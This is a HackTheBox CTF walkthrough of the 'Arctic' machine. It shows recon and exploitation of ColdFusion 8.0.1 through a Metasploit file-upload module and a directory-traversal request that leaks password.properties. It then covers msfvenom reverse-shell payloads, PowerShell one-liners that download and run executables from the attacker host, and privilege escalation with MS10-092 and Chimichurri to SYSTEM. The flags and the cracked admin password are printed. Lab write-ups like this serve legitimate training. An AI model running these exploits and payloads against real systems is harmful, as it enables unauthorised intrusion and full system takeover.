---
title: "Walk-through of Arctic from HackTheBox"
header:
  teaser: /assets/images/2020-08-02-21-55-28.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - 
  - 
  - 
  - 
---

## Machine Information

![hackthebox-arctic](/assets/images/2020-08-02-21-55-28.png)

Arctic is rated easy and is a fairly straightforward box. Basic troubleshooting is required to get the correct exploit functioning properly. Skills required are basic knowledge of Windows, enumerating ports and services. Skills learned are exploit modification, troubleshooting Metasploit modules and HTTP requests.
<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 009 - Easy - Arctic](https://www.hackthebox.eu/home/machines/profile/9) |
| Machine Release Date | 22nd March 2017 |
| Date I Completed It | 14th July 2019 |
| Distribution used | Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/) |

## Method using Meterpreter

### Initial Recon

Check for open ports with Nmap:

```text
nmap -sC -sV -oA arctic 10.10.10.11
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-29 22:14 BST
Nmap scan report for 10.10.10.11
Host is up (0.037s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.50 seconds
```

Nmap doesn't know what port 8500 is, so have a look at that:

![arcic-website](/assets/images/2020-08-02-22-00-23.png)

Has a 30 second wait every time you click on a page/link on this port.

Looking around i find this:

![arctic-coldfusion](/assets/images/2020-08-02-22-01-06.png)


Have a look on searchsploit:
searchsploit coldfusion 8.0.1
---------------------------------------------------------- ----------------------------------------
 Exploit Title                                            |  Path
                                                                  | (/usr/share/exploitdb/)
---------------------------------------------------------- ----------------------------------------
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm | exploits/cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authent | exploits/cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_loginto | exploits/cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/ | exploits/cfm/webapps/33168.txt
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Met | exploits/cfm/webapps/16788.rb

This one looks good, with file upload and metasploit module. So start msf and search:
msfconsole
msf5> search coldfusion

Matching Modules
================

   #  Name                                                           Disclosure Date  Rank       Check  Description
   -  ----                                                           ---------------  ----       -----  -----------
   7  exploit/windows/http/coldfusion_fckeditor                      2009-07-03       excellent  No     ColdFusion 8.0.1 Arbitrary File Upload and Execute

msf5 > use exploit/windows/http/coldfusion_fckeditor
msf5 exploit(windows/http/coldfusion_fckeditor) > options

Module options (exploit/windows/http/coldfusion_fckeditor):
   Name           Current Setting                                                             Required  Description
   ----           ---------------                                                             --------  -----------
   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm 
   Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                                   yes       The target address range or CIDR identifier
   RPORT          80                                                                       yes       The target port (TCP)
   SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections
   VHOST                                                                                     no        HTTP server virtual host
Exploit target:
   Id  Name
   --  ----
   0   Universal Windows Target

msf5 exploit(windows/http/coldfusion_fckeditor) > set RHOST 10.10.10.11
RHOST => 10.10.10.11
msf5 exploit(windows/http/coldfusion_fckeditor) > set RPORT 8500
RPORT => 8500
msf5 exploit(windows/http/coldfusion_fckeditor) > run

[*] Started reverse TCP handler on 10.10.14.31:4444 
[*] Sending our POST request...
[-] Upload Failed...
[*] Exploit completed, but no session was created.

Fails almost instantly, seems the delay on the webserver is stopping msf from executing.

Go to Burp, set up a new listener, bind to port 8500:

![burp-proxy](/assets/images/2020-08-02-22-01-55.png)

Redirect any requests that come to it on to the box:

![burp-proxy-listeners](/assets/images/2020-08-02-22-02-20.png)

Ok out and make sure it's enabled:

![burp-proxy-enabled](/assets/images/2020-08-02-22-02-54.png)

Back to msf and set RHOST to 127.0.0.1 now, so it goes via Burp:
msf5 exploit(windows/http/coldfusion_fckeditor) > set RHOST 127.0.0.1
RHOST => 127.0.0.1
msf5 exploit(windows/http/coldfusion_fckeditor) > exploit
[*] Started reverse TCP handler on 10.10.14.31:4444 
[*] Sending our POST request...

Now go back to Burp, will see it intercepted:

![burp-intercept](/assets/images/2020-08-02-22-04-18.png)

Can see the exploit is using a null byte (%00) at the end to execute code.

Send to Repeater and have a look:

![burp-response](/assets/images/2020-08-02-22-04-39.png)

Using the null byte allowed the upload of the EU.jsp file as well as the WVSKVYWB.txt file.

On a new terminal start a nc listener:
nc -lvnp 4444
listening on [any] 4444 ...

Now go back to web page and load the .jsp file:

![arctic-browser-jsp](/assets/images/2020-08-02-22-05-02.png)


Page will hang for 30 seconds as before, but then will open a reverse shell to my nc listener:
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.11] 49342
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>more c:\users\tolis\Desktop\user.txt
more c:\users\tolis\Desktop\user.txt
Gives the user flag: 02650d3a69a70780c302e146a6cb96f3

Now on a meterpreter shell as user. Next step is to upload a fully fledged reverse shell to get priv escalation.
Create a payload with msfvenom:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.31 LPORT=444 -f exe >  met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes

Now start an http server in this folder so we can get to the file:
python -m SimpleHTTPServer

Start msfconsole and get a handler waiting for reverse connection:
msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > show options
Module options (exploit/multi/handler):
   Name  Current Setting  Required  Description
   ----  ---------------  --------  ----------
Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target
msf5 exploit(multi/handler) > set windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > options
Module options (exploit/multi/handler):
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process        yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                              yes       The listen address (an interface may be specified)
   LPORT        4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target
msf5 exploit(multi/handler) > set LHOST 10.10.14.31
LHOST => 10.10.14.31
msf5 exploit(multi/handler) > set LPORT 444
LPORT => 444
msf5 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.14.31:444 

Go back to original shell on box, or if needed reconnect using a nc listener and going in a browser to: http://10.10.10.11:8500//userfiles/file/EU.jsp <---- file EU.jsp may be different, as it's randomly created by original exploit.
Now get the payload we created in msfvenom:
powershell.exe "(New-Object System.Net.WebClient).downloadFile('http://10.10.14.31:8000/met.exe','met.exe')"
File will be downloaded to current directory, now just run to open reverse shell back to msfconsole:
C:\ColdFusion8\runtime\bin>met.exe
met.exe

Switch back to msfconsole, should see the shell connecting:
[*] Sending stage (179779 bytes) to 10.10.10.11
[*] Meterpreter session 1 opened (10.10.14.31:444 -> 10.10.10.11:55017) at 2019-07-30 22:34:16 +0100

Now have a proper reverse_tcp shell to box:
meterpreter > sysinfo
Computer        : ARCTIC
OS              : Windows 2008 R2 (Build 7600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x64/windows

But only as user:
meterpreter > getuid
Server username: ARCTIC\tolis

Put current session to background so we can run priv esc exploit:
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use exploit/windows/local/ms10_092_schelevator
msf5 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
SESSION => 1
msf5 exploit(windows/local/ms10_092_schelevator) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms10_092_schelevator) > set LHOST 10.10.14.31
LHOST => 10.10.14.31
msf5 exploit(windows/local/ms10_092_schelevator) > set LPORT 1234
LPORT => 1234
msf5 exploit(windows/local/ms10_092_schelevator) > exploit
[*] Started reverse TCP handler on 10.10.14.31:1234 
[*] Preparing payload at C:\Users\tolis\AppData\Local\Temp\SBrfJlgmrqFzj.exe
[*] Creating task: OmogtONV5
[*] SUCCESS: The scheduled task "OmogtONV5" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\OmogtONV5...
[*] Original CRC32: 0xadd0c21d
[*] Final CRC32: 0xadd0c21d
[*] Writing our modified content back...
[*] Validating task: OmogtONV5
[*] 
[*] Folder: \
[*] TaskName                                 Next Run Time          Status         
[*] ======================================== ====================== ===============
[*] OmogtONV5                                1/9/2019 8:35:00       Ready          
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "OmogtONV5" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "OmogtONV5" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (179779 bytes) to 10.10.10.11
[*] SUCCESS: Attempted to run the scheduled task "OmogtONV5".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.31:1234 -> 10.10.10.11:55040) at 2019-07-30 22:39:54 +0100
[*] SUCCESS: The scheduled task "OmogtONV5" was successfully deleted.
[*] SCHELEVATOR

Should now have a shell as root:
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

Can now navigate to root.txt:
meterpreter > cd C:\users\administrator\Desktop
meterpreter > dir
Listing: C:\users\administrator\Desktop
=======================================
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-22 17:47:48 +0000  desktop.ini
100444/r--r--r--  32    fil   2017-03-22 19:01:59 +0000  root.txt
meterpreter > cat root.txt

Gives root flag: Ce65ceee66b2b5ebaff07e50508ffb90

Alternative Method (not using MetaSploit)

We know it's using Coldfusion, so look for another way in:
root@kali:~/htb/machines/arctic# searchsploit coldfusion traversal
------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                   |  Path
                                                                                         | (/usr/share/exploitdb/)
------------------------------------------------------------ ----------------------------------------
Adobe ColdFusion - Directory Traversal                           | exploits/multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)    | exploits/multiple/remote/16985.rb
---------------------------------------------------------------------------------- ----------------------------------------

Looks good, checking it out shows:
searchsploit -x exploits/multiple/remote/14641.py

# Working GET request courtesy of carnal0wnage:
# http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

So can try this on the box:
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../ColdFusion8/lib/password.properties%00en

Gives this:

![arctic-coldfusion](/assets/images/2020-08-02-22-06-03.png)

Password looks hashed, use hash-identifier to find out how:
root@kali:~/htb/machines/arctic# hash-identifier 
--------------------------------------------------------------------
HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 
Possible Hashs:
[+]  SHA-1
[+]  MySQL5 - SHA-1(SHA-1($pass))

Try cracking it here: https://hashkiller.co.uk/Cracker/SHA1, gives me:

![hashkiller-result](/assets/images/2020-08-02-22-07-04.png)

Create a java payload using msfvenom:
root@kali:~/htb/machines/arctic# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.31 LPORT=4444 -f raw > shell.jsp
Payload size: 1497 bytes

Now start an http server in this folder so we can get to the file:
python -m SimpleHTTPServer 80

Go back to login page here: http://10.10.10.11:8500/CFIDE/administrator, use admin and happyday to get in.

Once in go to Debugging & Logging then Scheduled Tasks:

![coldfusion-debugging](/assets/images/2020-08-02-22-07-35.png)

Create a new task:

![coldfusion-create-task](/assets/images/2020-08-02-22-08-00.png)

Once created need to click the left green button to run:

![coldfusion-run-task](/assets/images/2020-08-02-22-08-26.png)

Start a nc listener on port 4444 to catch the reverse shell:
root@kali:~/htb/machines/arctic# nc -lvnp 4444
listening on [any] 4444 ...

Now go to website on box and open the shell we've uploaded:

![arctic-shell](/assets/images/2020-08-02-22-09-21.png)


Back to terminal and should get a connection our shell, and are on as user:
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.11] 60740
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
Get user flag as above.

On as user, now need to priv esc to root, use Chimichurri:
root@kali:~/htb/machines/arctic# git clone https://github.com/Re4son/Chimichurri.git
Cloning into 'Chimichurri'...
remote: Enumerating objects: 66, done.
remote: Counting objects: 100% (66/66), done.
remote: Compressing objects: 100% (40/40), done.
remote: Total 66 (delta 23), reused 66 (delta 23), pack-reused 0
Unpacking objects: 100% (66/66), done.
root@kali:~/htb/machines/arctic/Chimichurri# cp Chimichurri.exe ..

Back on box, download file to it:
C:\Users\tolis>powershell.exe "(New-Object System.Net.WebClient).downloadFile('http://10.10.14.31/Chimichurri.exe','chimichurri.exe')"
C:\Users\tolis>dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5
 Directory of C:\Users\tolis
02/08/2019  08:49    <DIR>          .
02/08/2019  08:49    <DIR>          ..
02/08/2019  08:52            97.280 chimichurri.exe
22/03/2017  10:00    <DIR>          Contacts
22/03/2017  10:00    <DIR>          Desktop
22/03/2017  10:00    <DIR>          Documents
22/03/2017  10:00    <DIR>          Downloads
22/03/2017  10:00    <DIR>          Favorites
22/03/2017  10:00    <DIR>          Links
22/03/2017  10:00    <DIR>          Music
22/03/2017  10:00    <DIR>          Pictures
22/03/2017  10:00    <DIR>          Saved Games
22/03/2017  10:00    <DIR>          Searches
22/03/2017  10:00    <DIR>          Videos
               1 File(s)         97.280 bytes
              13 Dir(s)  32.815.558.656 bytes free

Start a new terminal and set a nc listener to catch the exploit:
root@kali:~/htb/machines/arctic# nc -lvnp 4445
listening on [any] 4445 ...

On box run the exploit and point at listener:
C:\Users\tolis>chimichurri.exe 10.10.14.31 4445
chimichurri.exe 10.10.14.31 4445
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
C:\Users\tolis>

Switch to nc on other terminal, should now be root:
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.11] 60826
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Users\tolis>whoami
whoami
nt authority\system
Get root flag as above.
